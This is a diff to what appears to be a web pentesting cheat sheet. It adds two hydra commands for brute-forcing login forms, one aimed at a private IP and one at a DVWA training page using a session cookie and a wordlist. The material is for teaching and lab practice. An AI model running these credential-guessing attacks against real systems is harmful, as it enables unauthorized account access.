@@ -31,7 +31,15 @@ permalink: /web/
 
 For example attacking a web login form
 
-`hydra 192.168.1.69 http-form-post "form_login.php:user=^USER^&pass=^PASS^:Bad login" -L users.txt -P pass.txt -o hydra-http-post-attack.txt`
+```
+hydra 192.168.1.69 http-form-post "form_login.php:user=^USER^&pass=^PASS^:Bad login" -L users.txt -P pass.txt -o hydra-http-post-attack.txt
+```
+
+Or a get form with cookies
+
+```
+hydra 192.168.0.11 -l admin -P /usr/share/set/src/fasttrack/wordlist.txt http-get-form “dvwa/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: security=Low;PHPSESSID=eogppved743ckngeo0so6tnp87"
+```
 
 ### SSL/TLS
 
